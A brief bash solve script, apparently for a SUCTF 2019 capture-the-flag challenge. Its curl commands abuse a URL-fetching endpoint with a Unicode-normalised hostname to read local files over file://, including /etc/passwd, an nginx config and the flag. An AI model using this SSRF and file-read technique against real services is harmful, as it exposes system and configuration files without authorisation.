#!/usr/bin/env bash

# Author : Virink <virink@outlook.com>
# Date   : 2019/08/18, 23:00

# curl -s -k -q "http://47.111.59.243:9000/getUrl?url=file://suctf.%E3%8F%84/etc/passwd" --output -

# 有毒的路径
# curl -s -k -q "http://47.111.59.243:9000/getUrl?url=file://suctf.%E3%8F%84/usr/local/nginx/conf/nginx.conf" --output -

curl -s -k -q "http://47.111.59.243:9000/getUrl?url=file://suctf.%E3%8F%84/usr/fffffflag" --output -